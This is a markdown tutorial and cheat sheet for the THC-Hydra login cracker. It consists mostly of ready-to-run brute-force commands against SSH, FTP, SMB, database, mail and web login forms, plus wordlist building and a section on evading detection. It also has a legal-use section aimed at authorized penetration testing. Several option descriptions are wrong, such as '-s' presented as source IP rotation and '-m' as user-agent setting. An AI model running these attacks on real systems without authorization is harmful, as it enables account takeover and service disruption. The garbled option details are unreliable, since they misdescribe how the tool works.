# 🔐 Hydra - Network Login Cracker

> THC-Hydra is a parallelized login cracker that supports numerous protocols for attacking authentication mechanisms.

---

## 📌 What is Hydra?

**THC-Hydra** is a fast network logon cracker that supports many different services and protocols. It's designed to test the security of authentication systems by attempting to crack passwords through brute force and dictionary attacks.

### Supported Protocols:
- 🌐 **Web**: HTTP(S) Forms, Basic Auth, Digest Auth
- 📧 **Email**: SMTP, POP3, IMAP
- 🔐 **Remote Access**: SSH, RDP, VNC, Telnet
- 🗄️ **Databases**: MySQL, PostgreSQL, Oracle, MSSQL
- 📁 **File Services**: FTP, SFTP, SMB/CIFS
- 🎮 **Gaming**: Teamspeak, Rexec, Rlogin
- And 50+ more protocols!

---

## 🚀 Installation

### Kali Linux (Pre-installed)
```bash
# Hydra comes pre-installed on Kali Linux
hydra --help
```

### Ubuntu/Debian
```bash
sudo apt update
sudo apt install hydra
```

### From Source
```bash
# Install dependencies
sudo apt install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev

# Compile from source
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

---

## 🎯 Basic Usage

### General Syntax
```bash
hydra [options] target service
```

### Simple Examples
```bash
# SSH brute force with single username
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP brute force with username list
hydra -L userlist.txt -P passlist.txt ftp://192.168.1.100

# HTTP POST form attack
hydra -l admin -P passlist.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
```

---

## 🔧 Core Commands & Options

### Authentication Methods
```bash
# Single username and password
hydra -l username -p password target service

# Single username, multiple passwords
hydra -l username -P passwordlist.txt target service

# Multiple usernames, single password
hydra -L userlist.txt -p password target service

# Multiple usernames and passwords
hydra -L userlist.txt -P passwordlist.txt target service

# Username:password combination file
hydra -C combo.txt target service
```

### Performance Options
```bash
# Number of parallel connections (default: 16)
hydra -t 32 -L users.txt -P pass.txt target service

# Tasks per connection (default: 64)
hydra -T 4 -L users.txt -P pass.txt target service

# Add wait time between connections (seconds)
hydra -w 3 -L users.txt -P pass.txt target service

# Exit after first valid password found
hydra -f -L users.txt -P pass.txt target service
```

### Output & Logging
```bash
# Verbose output
hydra -v -l admin -P pass.txt target service

# Very verbose (debug mode)
hydra -V -l admin -P pass.txt target service

# Save output to file
hydra -o results.txt -l admin -P pass.txt target service

# Resume interrupted session
hydra -R
```

---

## 🌐 Web Application Attacks

### 1. HTTP Basic Authentication
```bash
# Basic auth brute force
hydra -L users.txt -P pass.txt target http-get /admin/

# With specific user agent
hydra -L users.txt -P pass.txt -m "Mozilla/5.0..." target http-get /admin/
```

### 2. HTTP POST Form Attack
```bash
# Login form attack
hydra -l admin -P pass.txt target http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"

# With additional parameters
hydra -l admin -P pass.txt target http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid login"

# HTTPS form attack
hydra -l admin -P pass.txt target https-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
```

### 3. HTTP GET Form Attack
```bash
# GET-based login
hydra -l admin -P pass.txt target http-get-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
```

### 4. Advanced Web Options
```bash
# With cookies
hydra -l admin -P pass.txt target http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"

# With custom headers
hydra -l admin -P pass.txt target http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid:H=X-Forwarded-For: 127.0.0.1"

# Follow redirects
hydra -l admin -P pass.txt target http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid:F=302"
```

---

## 🔐 Network Service Attacks

### 1. SSH Brute Force
```bash
# Basic SSH attack
hydra -l root -P pass.txt ssh://192.168.1.100

# SSH with specific port
hydra -l root -P pass.txt ssh://192.168.1.100:2222

# SSH with timeout
hydra -w 5 -l root -P pass.txt ssh://192.168.1.100
```

### 2. FTP Attacks
```bash
# FTP brute force
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# Anonymous FTP check
hydra -l anonymous -p "" ftp://192.168.1.100
```

### 3. SMB/NetBIOS Attacks
```bash
# SMB brute force
hydra -L users.txt -P pass.txt smb://192.168.1.100

# NetBIOS attack
hydra -L users.txt -P pass.txt 192.168.1.100 smb
```

### 4. Database Attacks
```bash
# MySQL brute force
hydra -L users.txt -P pass.txt mysql://192.168.1.100

# PostgreSQL attack
hydra -l postgres -P pass.txt postgres://192.168.1.100

# MSSQL attack
hydra -L users.txt -P pass.txt mssql://192.168.1.100
```

### 5. Email Service Attacks
```bash
# SMTP brute force
hydra -L users.txt -P pass.txt smtp://mail.target.com

# POP3 attack
hydra -L users.txt -P pass.txt pop3://mail.target.com

# IMAP attack
hydra -L users.txt -P pass.txt imap://mail.target.com
```

---

## 📊 Advanced Techniques

### 1. Combo File Attacks
Create a file with username:password combinations:
```bash
# combo.txt format
admin:admin
root:root
user:password123
test:test123

# Use combo file
hydra -C combo.txt target service
```

### 2. Password Generation
```bash
# Use password generation module
hydra -l admin -x 4:6:a target service  # 4-6 chars, lowercase
hydra -l admin -x 6:8:aA1 target service  # 6-8 chars, mixed case + numbers
hydra -l admin -x 8:10:aA1! target service  # 8-10 chars, all character sets
```

### 3. Proxy Support
```bash
# HTTP proxy
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P pass.txt target service

# SOCKS proxy
export HYDRA_PROXY=socks4://proxy:1080
hydra -l admin -P pass.txt target service
```

### 4. Session Restoration
```bash
# Hydra automatically saves state to hydra.restore
# Resume interrupted attack
hydra -R

# Resume from specific restore file
hydra -R -o new_results.txt
```

---

## 💡 Real-World Scenarios

### 1. Web Application Login Testing
```bash
# Capture login request with Burp Suite first
# POST /login.php HTTP/1.1
# Content-Type: application/x-www-form-urlencoded
# username=admin&password=test&submit=Login

# Convert to Hydra command
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid username or password"
```

### 2. SSH Server Hardening Test
```bash
# Test common credentials
hydra -L common_users.txt -P common_pass.txt ssh://server.company.com

# Test against specific user with time delay
hydra -l serviceaccount -P passwords.txt -w 10 -t 4 ssh://server.company.com
```

### 3. WordPress Admin Testing
```bash
# WordPress admin brute force
hydra -l admin -P pass.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

### 4. Network Service Discovery and Testing
```bash
# First, discover services with nmap
nmap -sV -p 21,22,23,25,53,80,110,443,993,995 target.com

# Then test discovered services
hydra -L users.txt -P pass.txt ftp://target.com
hydra -L users.txt -P pass.txt ssh://target.com
hydra -L users.txt -P pass.txt smtp://target.com
```

---

## 🛡️ Evasion & Stealth Techniques

### 1. Rate Limiting Bypass
```bash
# Slow down attacks to avoid detection
hydra -w 5 -t 1 -L users.txt -P pass.txt target service

# Random delays
hydra -W 2 -L users.txt -P pass.txt target service
```

### 2. Source IP Rotation
```bash
# Use different source IPs (requires multiple network interfaces)
hydra -s 2222 -L users.txt -P pass.txt target service
```

### 3. User Agent Randomization
```bash
# For HTTP attacks, vary user agents
hydra -m "Mozilla/5.0 (X11; Linux x86_64)" -L users.txt -P pass.txt target http-post-form
```

---

## 📝 Wordlist Management

### Common Wordlists (Kali Linux)
```bash
# Password lists
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/wfuzz/others/common_pass.txt

# Username lists
/usr/share/wordlists/metasploit/unix_users.txt
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

### Creating Custom Wordlists
```bash
# Common usernames
echo -e "admin\nroot\nuser\ntest\nguest\nadministrator" > users.txt

# Common passwords
echo -e "password\n123456\nadmin\nroot\ntest\nguest" > pass.txt

# Extract from website with CeWL
cewl -w wordlist.txt -d 2 -m 5 http://target.com

# Generate mutations
john --wordlist=base.txt --rules --stdout > mutated.txt
```

### Smart Wordlist Usage
```bash
# Start with small, targeted lists
hydra -L top_users.txt -P top_pass.txt target service

# If successful, expand the attack
hydra -L expanded_users.txt -P /usr/share/wordlists/rockyou.txt target service
```

---

## 🎯 Best Practices

### 1. Pre-Attack Reconnaissance
```bash
# Gather information first
nmap -sV target
nikto -h target
whatweb target

# Look for default credentials in application documentation
# Check for account lockout policies
# Identify authentication mechanisms
```

### 2. Gradual Escalation
```bash
# Start small and targeted
hydra -l admin -p admin target service

# Common credentials
hydra -C common_creds.txt target service

# Dictionary attack
hydra -L users.txt -P small_pass.txt target service

# Full wordlist (last resort)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target service
```

### 3. Account Lockout Awareness
```bash
# Test for lockout policies first
hydra -l testuser -p wrongpass1 -p wrongpass2 -p wrongpass3 -f target service

# If lockout detected, adjust strategy
hydra -w 300 -t 1 -L users.txt -p commonpass target service  # 5-minute delays
```

---

## 🔍 Analyzing Results

### Understanding Output
```bash
# Successful login found
[22][ssh] host: 192.168.1.100   login: admin   password: password123

# Connection errors
[ERROR] could not connect to target port 22

# Authentication failures
[22][ssh] host: 192.168.1.100   login: admin   password: wrong
```

### Processing Results
```bash
# Extract successful logins
grep -E "\[.*\]\[.*\].*login:" hydra_output.txt

# Count attempts
grep -c "login:" hydra_output.txt

# Extract unique successful credentials
grep "login:" hydra_output.txt | awk '{print $5 ":" $7}' | sort -u
```

---

## 🚨 Troubleshooting Common Issues

### 1. Connection Problems
```bash
# Test basic connectivity first
telnet target.com 22
nc -zv target.com 22

# Check for firewalls/rate limiting
nmap -sS -O target.com
```

### 2. HTTP Form Issues
```bash
# Capture request with Burp Suite or browser dev tools
# Verify form parameters and failure messages
# Check for CSRF tokens or captchas
```

### 3. Performance Issues
```bash
# Reduce threads if connections fail
hydra -t 4 -L users.txt -P pass.txt target service

# Increase wait time
hydra -w 10 -L users.txt -P pass.txt target service

# Check system resources
top
netstat -an | grep target_ip
```

---

## ⚖️ Legal and Ethical Considerations

### ✅ Authorized Testing
- Only test systems you own or have explicit written permission to test
- Follow responsible disclosure practices
- Document all testing activities
- Respect rate limits and system resources

### ⚠️ Warning Signs to Stop
- Account lockouts occurring
- System performance degradation
- Security team notifications
- Legal notices or warnings

### 🚫 Illegal Activities
- Never use Hydra against systems without permission
- Don't ignore terms of service or acceptable use policies
- Avoid testing during business hours without approval
- Don't use discovered credentials for unauthorized access

---

## 📚 Learning Resources

### Practice Environments
- **Metasploitable**: Linux virtual machine with vulnerable services
- **DVWA**: Web application with various vulnerability levels
- **VulnHub**: Virtual machines for penetration testing practice
- **TryHackMe**: Guided rooms for Hydra practice

### Documentation
- **THC-Hydra GitHub**: Official repository and documentation
- **Hydra man page**: `man hydra` for complete option reference
- **Kali Linux Documentation**: Hydra usage examples

---

## 🔗 Quick Reference Commands

```bash
# Web application form attack
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SSH brute force
hydra -L users.txt -P pass.txt ssh://target.com

# FTP brute force
hydra -L users.txt -P pass.txt ftp://target.com

# MySQL database attack
hydra -l root -P pass.txt mysql://target.com

# SMB/Windows shares
hydra -L users.txt -P pass.txt smb://target.com

# HTTP basic authentication
hydra -L users.txt -P pass.txt target.com http-get /admin/

# SMTP mail server
hydra -L users.txt -P pass.txt smtp://mail.target.com

# Resume interrupted session
hydra -R

# Generate passwords (6-8 chars, alphanumeric)
hydra -l admin -x 6:8:aA1 target.com ssh
```

---

<div class="notice--danger">
  <h4>🚨 Critical Warning</h4>
  <p>Hydra is an extremely powerful tool that can cause account lockouts, service disruption, and legal consequences if misused. Always ensure you have proper authorization before testing any system, and use reasonable limits to avoid damaging target systems.</p>
</div>

---

*Master Hydra responsibly and help organizations improve their authentication security through ethical penetration testing.*